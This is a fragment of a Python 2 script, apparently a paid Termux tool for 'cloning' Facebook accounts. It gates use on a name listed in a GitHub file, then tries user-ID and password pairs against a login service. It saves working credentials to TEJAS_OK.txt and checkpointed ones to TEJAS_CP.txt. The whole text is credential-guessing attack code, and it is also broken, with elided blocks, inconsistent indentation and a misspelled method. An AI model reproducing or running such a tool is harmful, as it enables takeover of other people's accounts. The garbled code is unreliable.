...
def reg():
    ...
    print logo
    print ''
    print '\x1b[1;31;1m Paid Termux Clonning Commands'
    print ''
    time.sleep(1)
    try:
        to = 'TEJAS SINGH'
    ...
    r = requests.get('https://raw.githubusercontent.com/tejassinghrajput/tejas/main/server.txt').text
    if to in r:
                    ...
                    if 'loc' in q:
                        ...
                        if 'loc' in q:
                            ...
                            cps.apppend(uid + pass4)
                               ...
                               q = json.loads(data)
                                  if 'loc' in q:
                                        print '\x1b[1;92m[TEJAS-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/TEJAS_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass5 + '\n')
                                        ok.close()
                                        oks.append(uid + pass5)
                                    elif 'www.facebook.com' in q['error']:
                                   print '\x1b[1;31;1m[TEJAS-CP] ' + uid + ' | ' + pass5
                                   cp = open('TEJAS_CP.txt', 'a')
                                   cp.write(uid + ' | ' + pass5 + '\n')
                                   cp.close()
